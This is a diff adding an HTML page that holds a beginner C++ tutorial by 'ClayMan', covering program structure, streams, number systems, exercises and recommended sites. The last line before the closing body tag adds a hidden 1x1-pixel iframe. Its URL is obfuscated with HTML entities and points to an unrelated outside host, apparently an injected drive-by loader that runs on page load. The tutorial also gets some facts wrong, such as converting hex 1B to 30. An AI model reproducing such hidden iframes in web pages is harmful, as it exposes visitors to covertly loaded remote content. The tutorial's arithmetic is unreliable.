@@ -1,0 +1,441 @@
+<html>
+<head>
+<title>C++ Tutorial I By ClayMan</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
+<style type="text/css">
+<!--
+a:active {  text-decoration: none}
+a:hover {  text-decoration: underline; color: #999999}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+</head>
+
+<body bgcolor="#000000" text="#CCCCCC" link="#99CCFF" vlink="#CCCCFF" alink="#CCFF99" leftmargin="20" topmargin="10" marginwidth="0" marginheight="0">
+<center>
+  <p align="center"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><br>
+    </b><font face="Book Antiqua" color="#FFFFFF" size="5">C++ Tutorial | By Clayman</font></font></p>
+  <p align="left"><font color="#FFFFFF" size="2"><br>
+    <br>
+    </font></p>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="1" color="#999999">-----------------------------------------<br>
+    </font><font face="Georgia, Times New Roman, Times, serif" size="2" color="#FFFFFF"><font face="Arial, Helvetica, sans-serif"><b>TABLE 
+    OF CONTENTS<br>
+    </b></font><font size="2" face="Arial, Helvetica, sans-serif"><b> </b></font><font size="4"><font color="#999999" size="1" face="Arial, Helvetica, sans-serif">-----------------------------------------<br>
+    </font> </font></font></p>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2">1. <a href="#introduction">Introduction</a> 
+    </font></p>
+  <div align="left"> 
+    <ul>
+      <li><font face="Arial, Helvetica, sans-serif" size="2">1.1. Why do people 
+        program? </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">1.2. What is C++ 
+        &amp; OOP? </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">1.3. What do I need 
+        to program?<br>
+        </font></li>
+    </ul>
+  </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2">2. <a href="#yourfirstprogram">Your 
+    first program</a> </font> 
+  <div align="left"> 
+    <ul>
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.1. Running a C++ 
+        program </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.2. C++ program 
+        structure </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.3. Comments </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.4. Libraries </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.5. Functions </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.6. Streams </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">2.7. Return </font></li>
+    </ul>
+  </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2"><br>
+    3. <a href="#datandnumsystems">Number Systems</a> </font> 
+  <div align="left"> 
+    <ul>
+      <li><font face="Arial, Helvetica, sans-serif" size="2">3.1. Decimals </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">3.2. Binaries </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">3.3. Hexadecimals 
+        </font></li>
+    </ul>
+  </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2"><br>
+    4. <a href="#exercises">Exercises</a> </font> 
+  <div align="left"> 
+    <ul>
+      <li><font face="Arial, Helvetica, sans-serif" size="2">4.1. EX 1 : Running 
+        </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">4.2. EX 2 : Typing 
+        </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">4.3. EX 3 : Converting 
+        </font></li>
+    </ul>
+  </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2"><br>
+    5. <a href="#whatnow">What now?</a> </font> 
+  <div align="left"> 
+    <ul>
+      <li><font face="Arial, Helvetica, sans-serif" size="2">5.1. Good programming 
+        sites </font> 
+      <li><font face="Arial, Helvetica, sans-serif" size="2">5.2. Good books on 
+        C++<br>
+        </font></li>
+    </ul>
+    
+  </div>
+  <hr noshade size="1" align="left">
+  <p align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="-0"><br>
+    <font color="#FFFFFF" size="2"><a 
+      name=introduction><strong>1.INTRODUCTION</strong></a><br>
+    <br>
+    <strong>1.1. Why do People Program?</strong><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp; Each 
+    person can have his own reason for programming but I can tell you that programming 
+    is one of the best ways to gain a deep understanding of computers and computer 
+    technology. Learning to program makes you understand why computers and computer 
+    programs work the way they do. It also puts some sense into you about how 
+    hard it is to create software.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF" size="2">1.2. What is C++ &amp; OOP?</font></strong><font color="#FFFFFF" size="2"><br>
+    </font> <font size="2">&nbsp;&nbsp;&nbsp; <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; C++ is an extended 
+    version C. C was developed at Bell Labs, in 1978. The purpose was to create 
+    a simple language (simpler than assembly &amp; machine code...) which can 
+    be used on a variety of platforms. Later in the early 1980's C was extended 
+    to C++ to create an object-oriented language. O(bject) O(riented) P(rogramming) 
+    is a style of programming in which programs are made using Classes. A class 
+    id code in a file separate from the main program - more on classes later. 
+    OOP in general &amp; C++ in particular made it possible to handle the complexity 
+    of graphical environments. (like windows, macintosh..)<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">1.3. What do I need to program?</font></strong><font color="#FFFFFF"><br>
+    </font></font> <font size="2"><br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Well, you need 
+    a computer and a compiler to start with but you also need some curiosity and 
+    a lot of time. I guess(!?) you have a computer. You can find different compilers 
+    for free from <a href="http://www.borland.com/">borlands</a> website (Check 
+    5.1). If you have the curiosity but lack in time read stuff at lessons and 
+    detention hours. Read whenever you find time. Having a good C++ book (check 
+    5.2) also helps a lot. (and is much better for your eyes) One thing not to 
+    forget: No tutorial, book, program or course makes you a programmer in 5 days. 
+    YOU make yourself a programmer. NO compiler writes an entire program for you, 
+    YOU write the program.<br>
+    </font> <br>
+    </font><font color="#FFFFFF" size="2"><a name=yourfirstprogram><strong>2. 
+    YOUR FIRST PROGRAM</strong></a><br>
+    <br>
+    <strong>2.1. Running a C++ Program</strong><br>
+    </font><font size="2"> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Read this part 
+    carefully: A C++ program must be compiled and linked before it can be executed, 
+    or run, on the computer. A great lot of compilers do this automatically. So 
+    what is a compiler? A compiler is a program that translates C++ code into 
+    machine language. Machine language is the language consisting of 1s and 0s, 
+    and is the native language of a computer. A typed C++ program is called the 
+    source-code, and the compiled code is called the object code.<br>
+    &nbsp;&nbsp;&nbsp; <br>
+    &nbsp;&nbsp;&nbsp; Before the object code can be executed, it must be linked 
+    to other pieces of code (e.g. included libraries) used by the program. The 
+    compiled &amp; linked program is called an executable file. Finally, the program 
+    is executed by the system. It's output is displayed in a window.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">2.2. C++ Program Structure</font></strong><font color="#FFFFFF"><br>
+    <br>
+    </font> <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; All C++ 
+    progs contain statements (commands) that tell the computer what to do. Here 
+    is an example of a simple C++ program:<br>
+    </font></font></font></p>
+  <div align="left"> 
+    <table border=0 cellpadding=3 cellspacing=3 width="56%" bgcolor="#26343E">
+      <tbody> 
+      <tr> 
+        <td width="100%"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">/* 
+          Downloaded from code.box.sk<br>
+          We own you program */<br>
+          <br>
+          #include &lt;iostream.h&gt;<br>
+          <br>
+          int main()<br>
+          {<br>
+          &nbsp;&nbsp;&nbsp; cout&lt;&lt;"We own you"; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+          &nbsp; // the first statement<br>
+          &nbsp;&nbsp;&nbsp; return(0); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 
+          the second statement<br>
+          }</font></td>
+      </tr>
+      </tbody> 
+    </table>
+  </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2"><br>
+    Run the program. It should display :<br>
+    <br>
+    <font color="#FFFFFF">&nbsp;&nbsp;&nbsp; We own you<br>
+    </font> <br>
+    The structure of a simple C++ program is:<br>
+    </font></p>
+  <div align="left"> 
+    <table border=0 cellpadding=3 cellspacing=3 width="57%" bgcolor="#26343E">
+      <tbody> 
+      <tr> 
+        <td width="100%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">/* 
+          Comments : Name, purpose of the program <br>
+          &nbsp;&nbsp;&nbsp; your name, date, etc.&nbsp;&nbsp;&nbsp; */<br>
+          <br>
+          &nbsp;&nbsp;&nbsp; #include &lt;librarynames.h&gt;<br>
+          <br>
+          &nbsp;&nbsp;&nbsp; int main()<br>
+          &nbsp;&nbsp;&nbsp; {<br>
+          &nbsp;&nbsp;&nbsp; statements; // comments<br>
+          &nbsp;&nbsp;&nbsp; return(0);<br>
+          &nbsp;&nbsp;&nbsp; }</font></td>
+      </tr>
+      </tbody> 
+    </table>
+    <font face="Arial, Helvetica, sans-serif" size="2"><br>
+    </font> </div>
+  <p align="left"><font face="Arial, Helvetica, sans-serif" size="2">Now we will 
+    have a closer look on the structure:<br>
+    </font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <br>
+    <strong><font color="#FFFFFF">2.3. Comments<br>
+    </font></strong></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> 
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Comments are 
+    used to explain the contents of a program for a human reader. The computer 
+    ignores them. The symbols /* and */ are used for the beginning and end of 
+    a comment for multi-line comments. // symbols are also used for commenting. 
+    All characters on a line after the // symbol are considered to be comments 
+    and are ignored. Most newbies think that commenting a program is a waste of 
+    time. They are wrong. Commenting is very important because it makes the code 
+    understandable by other programmers and makes it easier to improve a program 
+    or fix the bugs in it. You'll understand better after trying to decipher a 
+    hundred pages of code you wrote a few months later.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">2.4. Libraries</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">Look at the program above. Following 
+    the opening comment was the line:<br>
+    </font> <br>
+    <font color="#FFFFFF">&nbsp;&nbsp;&nbsp; #include &lt;iostream.h&gt;<br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; This line simply 
+    tells the computer that the iostream library is needed therefore it should 
+    be included. A library is a collection of program code that can be included 
+    (and used) in a program to perform a variety of tasks. iostream is a library 
+    - also called as a header file, look at its extension - used to perform input/output 
+    (I/O) stream tasks. There are a lot of non-commercial C++ libraries for various 
+    purposes written by good guys who spent more than enough time in front of 
+    their computers. You can find them at code.box.sk. Also references to all 
+    libraries used in the tutorials can be found on the net.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">2.5. Functions</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">The next line in the program was:<br>
+    </font> <br>
+    <font color="#FFFFFF">&nbsp;&nbsp;&nbsp; int main()<br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Which is the 
+    header of the main function. Makes sense? No? A function is a set of statements 
+    that accomplish a task. A function header includes the return type of the 
+    function and the function name. As shown in the main() header, main returns 
+    an integer(int) through return(0). So all the functions that have an integer 
+    as the return type returns integers. Very clear. The statements in a function 
+    (in this case the main function) are enclosed in curly braces. The { and } 
+    symbols indicates the beginning and the end of statements. More on functions 
+    later.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">2.6. Streams</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; What is a stream? 
+    In C++ input/output devices are called streams. cout (we used above) is the 
+    c(onsole) out(put) stream, and the send (insertion) operator is used to send 
+    the data "We own you" into the stream. In the first statement:<br>
+    </font> <br>
+    <font color="#FFFFFF">&nbsp;&nbsp;&nbsp; cout&lt;&lt;"We own you";<br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; The words following 
+    the &lt;&lt; operator are put in quotation marks(") to form a string. When 
+    run, the string We own you is sent to the console output device. Yes, it is 
+    also called the computer screen.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">Important note: C++ is case sensitive. That 
+    means cout and Cout is not the same thing.</font></strong><font color="#FFFFFF"><br>
+    <br>
+    <strong>2.7. Return</strong><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">The second statement was:<br>
+    </font> <br>
+    <font color="#FFFFFF">&nbsp;&nbsp;&nbsp; return(0);<br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">which causes the program to terminate 
+    sending the value 0 to the computer. The value "0" indicates that the program 
+    terminated without error.<br>
+    </font> <br>
+    <font color="#FFFFFF" face="Arial, Helvetica, sans-serif"><b>Note:</b></font><font face="Arial, Helvetica, sans-serif"> 
+    The statements end with a semicolon (;). A semicolon in C++ indicate the end 
+    of a statement.</font><font face="Arial, Helvetica, sans-serif"><br>
+    </font></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><br>
+    <a name=datandnumsystems><strong>3. DATA &amp; NUMBER SYSTEMS</strong></a><br>
+    <br>
+    <strong>3.1. Decimals</strong><br>
+    <br>
+    </font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; 
+    The base 10 number system. Uses 10 digits: 0 to 9. Numbers raised to the zero 
+    power is equal to one. For example: 5 to the power 0 = 1. Base ten equivalent 
+    of the number <br>
+    </font> <br>
+    2600 =&nbsp;&nbsp;&nbsp;&nbsp; 2 x (10 to the power 3) + 6 x (10 to the power 
+    2)<br>
+    33 =&nbsp;&nbsp;&nbsp; 3 x (10 to the power 1) + 3 x (10 to the power 0)<br>
+    <br>
+    <strong><font color="#FFFFFF">3.2. Binaries</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; The base 2 number 
+    system. Uses 2 digits : 0 and 1. Works the same as base 10 except we multiply 
+    numbers by the powers of 2 instead. For example 110 is equal to 6 in base 
+    10:<br>
+    </font> <br>
+    110 =&nbsp;&nbsp;&nbsp; 1 x (2 to the power 2) + 1 x (2 to the power 1) = 
+    6(base10)<br>
+    <br>
+    <strong><font color="#FFFFFF">3.3. Hexadecimal</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; The base 16 number 
+    system. Uses 16 digits. 0 to 9 &amp; "A" to "F". Works the same as base 10 
+    &amp; base two except the numbers are multiplied by the powers of 16 instead:<br>
+    </font> <br>
+    1B =&nbsp;&nbsp;&nbsp; 1 x (16 to the power 1) + 2(B) x (16 to the power of 
+    0) = 30(base10)<br>
+    </font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+    <font color="#FFFFFF"><a name=exercises><strong>4. EXERCISES</strong></a><br>
+    <br>
+    <strong>4.1. Running</strong><br>
+    <br>
+    </font> <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Find 
+    &amp; install a compiler, type the example program and run it. Pretty simple 
+    but be sure the syntax is correct.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">4.2. Typing</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp; Make a program 
+    which displays your name without looking to this tutorial. Makes you learn 
+    a lot better.<br>
+    </font> <br>
+    <strong><font color="#FFFFFF">4.3. Converting</font></strong><font color="#FFFFFF"><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">Convert these to decimals &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+    : 110101, 001101, 10101110<br>
+    Convert these to hexadecimals&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 234, 324, 
+    19394<br>
+    Convert these to binaries&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+    &nbsp;&nbsp; : 2F, 1B3, 234, 125<br>
+    </font> <br>
+    <br>
+    <font color="#FFFFFF"><a 
+      name=whatnow><strong>5. WHAT NOW?</strong></a><br>
+    &nbsp;&nbsp;&nbsp; <br>
+    <strong>5.1. Good programming related sites</strong><br>
+    </font> <br>
+    <font face="Arial, Helvetica, sans-serif">Here are a few good sites about 
+    programming:<br>
+    </font> </font></p>
+  <div align="left"> 
+    <table border=0 cellpadding=2 cellspacing=2 width="100%">
+      <tbody> 
+      <tr bgcolor="#000000"> 
+        <td width="252"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a 
+            href="http://code.box.sk/">http://code.box.sk</a></font></td>
+        <td width="688"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">--&gt; 
+          Very good content. Has message boards.</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="252"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a 
+            href="http://www.borland.com/">http://www.borland.com</a></font></td>
+        <td width="688"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">--&gt; 
+          Free, shareware &amp; commercial compilers.</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="252"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a 
+            href="http://www.cprogramming.com/">http://www.cprogramming.com</a></font></td>
+        <td width="688"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">--&gt; 
+          Some original tuts.</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="252"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a 
+            href="http://www.planet-source-code.com/">http://www.planet-source-code.com</a></font></td>
+        <td width="688"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">--&gt; 
+          One of the biggest code archive.</font></td>
+      </tr>
+      </tbody> 
+    </table>
+  </div>
+  <p align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+    <strong><font color="#FFFFFF">5.2. Good books on C++</font></strong><font color="#FFFFFF"><br>
+    </font> </font></p>
+  <div align="left"> 
+    <table border=0 cellpadding=2 cellspacing=2 width="100%">
+      <tbody> 
+      <tr bgcolor="#000000"> 
+        <td height=20 
+width="500"><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><strong>Printed:</strong></font></td>
+        <td height=20 width="56%"></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="500"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><a 
+            href="http://www.amazon.com/exec/obidos/ASIN/0135289106/thetomegamingsit">C++ 
+          - How to Program</a></font></td>
+        <td width="56%"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">One 
+          of the best books written on C. Great for all levels of programming.</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="500" height="19"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><a 
+            href="http://www.amazon.com/exec/obidos/ASIN/0078824761/thetomegamingsit">C++: 
+          The complete reference</a></font></td>
+        <td width="56%"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">An 
+          overall C++ &amp; STL reference</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="500"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><a 
+            href="http://www.amazon.com/exec/obidos/ASIN/1879233916/thetomegamingsit">A 
+          Guide to Programming in C++, Lawrenceville Press</a></font></td>
+        <td width="56%"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">My 
+          first book on C++, "borrowed" lots of definitions from there :)</font></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="500"><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#FFFFFF"><strong><br>
+          Online books:</strong></font></td>
+        <td width="56%"></td>
+      </tr>
+      <tr bgcolor="#000000"> 
+        <td width="500" height="7"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Thinking 
+          in C++ is nearly the best one on C++, a must-read.</font></td>
+        <td width="56%" height="7"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">You 
+          can find many online netbooks from <a 
+            href="http://code.box.sk/">code.box.sk </a></font></td>
+      </tr>
+      </tbody> 
+    </table>
+  </div>
+  <p align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+    <font color="#FFFFFF"><strong>Thanks to:</strong><br>
+    <br>
+    </font> --&gt;Cube, to provide such valuable information in the <a 
+      href="http://www.boxnetwork.net/">boxnetwork</a> sites.<br>
+    --&gt;all guys at Neworder's Message board, for asking tutorials.<br>
+    <br>
+    <strong><font color="#FFFFFF">Ke Bea(!?) to:</font></strong><font color="#FFFFFF"><br>
+    </font> --&gt;all friends in the Koch Part-time Prison.</font></p>
+  <p align="left"><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><strong><font color="#FFFFFF">END 
+    OF TUTORIAL</font></strong><font color="#FFFFFF"><br>
+    </font> If you want to add something or modify the tutorial in any way please 
+    e-mail me first: <a 
+      href="mailto:clayman@boxnetwork.net">clayman@boxnetwork.net</a>. Feel 
+    free to distribute this as you wish.<br>
+    <br>
+    </font></p>
+</center>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
